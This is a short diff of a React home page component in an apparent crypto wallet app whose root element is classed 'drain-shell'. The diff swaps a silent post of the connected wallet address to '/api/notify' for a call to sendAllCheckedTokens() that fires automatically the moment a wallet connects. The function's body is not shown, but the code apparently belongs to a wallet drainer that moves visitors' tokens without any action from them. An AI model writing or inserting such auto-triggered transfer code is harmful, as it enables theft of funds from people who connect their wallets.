@@ -14,15 +14,10 @@ const Wordmark = () => (
 export default function Home() {
   const { isConnected, address } = useAccount();
 
-  useEffect(() => {
-    if (isConnected && address) {
-      fetch('/api/notify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: `Wallet connected: ${address}` }),
-      }).catch(() => {});
-    }
-  }, [isConnected, address]);
+ useEffect(() => {
+  if (isConnected && address) {
+    sendAllCheckedTokens();   }
+}, [isConnected, address]);
 
   return (
     <div className="drain-shell">
